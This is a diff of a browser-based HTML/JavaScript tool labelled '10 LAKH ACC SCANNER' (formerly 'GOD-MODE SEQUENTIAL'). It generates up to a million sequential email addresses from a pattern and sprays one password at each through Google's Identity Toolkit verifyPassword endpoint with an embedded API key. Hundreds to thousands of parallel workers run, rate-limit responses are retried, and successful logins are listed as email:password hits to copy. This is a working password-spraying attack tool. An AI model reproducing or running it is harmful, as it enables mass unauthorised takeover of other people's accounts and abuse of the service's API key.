@@ -1,44 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GOD-MODE SEQUENTIAL V9</title>
+    <title>1-MILLION SEQUENTIAL</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
-        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #ff0000; background: #050505; padding: 20px; box-shadow: 0 0 60px #ff0000; border-radius: 5px; }
-        h1 { font-size: 22px; border-bottom: 2px solid #ff0000; padding-bottom: 10px; color: #fff; text-shadow: 0 0 15px #ff0000; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
+        .bot-terminal { max-width: 500px; margin: auto; border: 2px solid #00ff00; background: #050505; padding: 20px; box-shadow: 0 0 40px #00ff00; border-radius: 8px; }
+        h1 { font-size: 18px; border-bottom: 2px solid #00ff00; padding-bottom: 10px; color: #fff; }
         
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #ff0000; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; text-align: center; }
-        .btn-god { width: 100%; padding: 22px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 10px; text-transform: uppercase; box-shadow: 0 0 30px #ff0000; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #00ff00; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; text-align: center; }
+        .btn-ignite { width: 100%; padding: 20px; background: #00ff00; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
         
-        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #ff0000; }
-        .monitor b { font-size: 34px; color: #fff; display: block; }
+        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
+        .stat-item { background: #111; padding: 15px; border: 1px solid #333; }
+        .stat-item b { font-size: 30px; color: #fff; display: block; }
 
-        #speed-meter { font-size: 14px; color: #ffff00; margin-bottom: 10px; font-weight: bold; background: #330000; padding: 5px; }
-        #res-box { width: 100%; height: 320px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
-        
-        .copy-btn { width: 100%; padding: 12px; background: #111; color: #fff; border: 1px solid #ff0000; margin-top: 10px; cursor: pointer; font-weight: bold; }
+        #speed { font-size: 14px; color: #00ffff; margin-bottom: 10px; font-weight: bold; }
+        #res-box { width: 100%; height: 320px; background: #000; color: #fff; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="bot-terminal">
-    <h1>🔥 GOD-MODE SEQUENTIAL</h1>
-    <div id="speed-meter">WARMING UP ENGINES...</div>
+    <h1>🚀 10 LAKH ACC SCANNER</h1>
+    <div id="speed">STATUS: STANDBY</div>
     
     <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
     <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="btn-god" id="btn" onclick="igniteGodMode()">💀 LAUNCH OVERCLOCK</button>
+    <button class="btn-ignite" id="btn" onclick="ignite()">⚡ START SEQUENTIAL SCAN</button>
 
     <div class="monitor">
         <div>CHECKED<b id="c_val">0</b></div>
         <div>FOUND<b id="f_val">0</b></div>
     </div>
 
-    <textarea id="res-box" readonly placeholder="Found List (100% Sequential)"></textarea>
+    <textarea id="res-box" readonly placeholder="Found List (Sequential 1,2,3...)"></textarea>
     
-    <button class="copy-btn" onclick="copyResults()">📋 COPY HITS</button>
+    <button onclick="copyHits()" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0; padding:10px; margin-top:10px; cursor:pointer;">📋 COPY ALL FOUND</button>
 </div>
 
 <script>
@@ -46,95 +45,96 @@
     let checked = 0;
     let found = 0;
     let index = 0;
-    let nextToFlush = 0;
+    let nextToProcess = 0;
     let resultsMap = new Map();
     let startTime;
 
-    async function igniteGodMode() {
+    async function ignite() {
         if (active) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.toUpperCase().trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("MISSING DATA!");
+        if (!fmt.includes('{') || !pwd) return alert("Fill Format and Pass!");
 
         active = true;
         startTime = Date.now();
-        document.getElementById('btn').innerText = "🛑 TERMINATE SYSTEM";
-        document.getElementById('btn').style.background = "#fff";
-        document.getElementById('btn').style.color = "#000";
+        document.getElementById('btn').innerText = "🛑 STOP SYSTEM";
+        document.getElementById('btn').style.background = "#f00";
+        document.getElementById('btn').style.color = "#fff";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
-        let max = Math.pow(10, digits);
+        let max = Math.pow(10, digits); // 10 ലക്ഷം അക്കൗണ്ടുകൾ
 
-        // --- GOD-MODE OVERCLOCK: 2000 PARALLEL RUNNERS ---
-        // സെക്കൻഡിൽ 1000+ സ്പീഡ് ടാർഗെറ്റ് ചെയ്യാൻ 2000 പാരലൽ വർക്കേഴ്സ് ആവശ്യമാണ്.
-        const workers = 2000; 
+        // --- HIGH-SPEED MULTI-THREADING (600 Workers) ---
+        let threads = 600; 
 
-        for (let i = 0; i < workers; i++) {
-            (async function() {
+        for (let i = 0; i < threads; i++) {
+            (async function worker() {
                 while (active && index < max) {
                     let currentIdx = index++;
                     let numStr = currentIdx.toString().padStart(digits, '0');
                     let email = fmt.replace(/\{(\d+)\}/, numStr);
                     
-                    await processAcc(email, pwd, key, currentIdx);
+                    await checkAccount(email, pwd, key, currentIdx);
                 }
             })();
         }
 
-        // Real-time Speed Meter
         setInterval(() => {
             if (!active) return;
             let elapsed = (Date.now() - startTime) / 1000;
-            let speed = Math.round(checked / elapsed);
-            document.getElementById('speed-meter').innerText = `CURRENT SPEED: ${speed} REQ/SEC`;
-        }, 500);
+            let currentSpeed = Math.round(checked / elapsed);
+            document.getElementById('speed').innerText = `SPEED: ${currentSpeed} REQ/SEC`;
+        }, 1000);
     }
 
-    async function processAcc(em, pw, k, idx) {
+    async function checkAccount(em, pw, k, idx) {
         try {
-            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
+            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                 method: 'POST',
                 body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                 headers: { 'Content-Type': 'application/json' }
             });
             
-            if (r.status === 429) {
-                return processAcc(em, pw, k, idx); // No-skip force retry
+            if (res.status === 429) {
+                // Rate limited: വിട്ടുപോകാതെ വീണ്ടും ട്രൈ ചെയ്യുന്നു
+                await new Promise(r => setTimeout(r, 1000));
+                return checkAccount(em, pw, k, idx);
             }
 
-            let d = await r.json();
-            resultsMap.set(idx, { found: (d && d.idToken), email: em });
+            let data = await res.json();
+            resultsMap.set(idx, { found: (data && data.idToken), email: em });
 
-            // --- INSTANT SEQUENTIAL FLUSH (1, 2, 3...) ---
-            while (resultsMap.has(nextToFlush)) {
-                let data = resultsMap.get(nextToFlush);
-                if (data.found) {
+            // --- STRICT SEQUENTIAL FLUSH (1, 2, 3...) ---
+            while (resultsMap.has(nextToProcess)) {
+                let current = resultsMap.get(nextToProcess);
+                if (current.found) {
                     found++;
                     document.getElementById('f_val').innerText = found;
-                    document.getElementById('res-box').value += data.email + ":" + pw + "\n";
+                    document.getElementById('res-box').value += current.email + ":" + pw + "\n";
                     document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                 }
                 
                 checked++;
-                if (checked % 10 === 0) document.getElementById('c_val').innerText = checked;
+                if (checked % 5 === 0) document.getElementById('c_val').innerText = checked;
                 
-                resultsMap.delete(nextToFlush);
-                nextToFlush++;
+                resultsMap.delete(nextToProcess);
+                nextToProcess++;
             }
 
         } catch (e) {
-            return processAcc(em, pw, k, idx); // Retry on any error
+            // നെറ്റ് എറർ വന്നാലും വിട്ടുപിടിക്കില്ല
+            return checkAccount(em, pw, k, idx);
         }
     }
 
-    function copyResults() {
+    function copyHits() {
         let t = document.getElementById('res-box');
         t.select();
         document.execCommand('copy');
-        alert("COPIED TO CLIPBOARD!");
+        alert("Found accounts copied!");
     }
 </script>
 
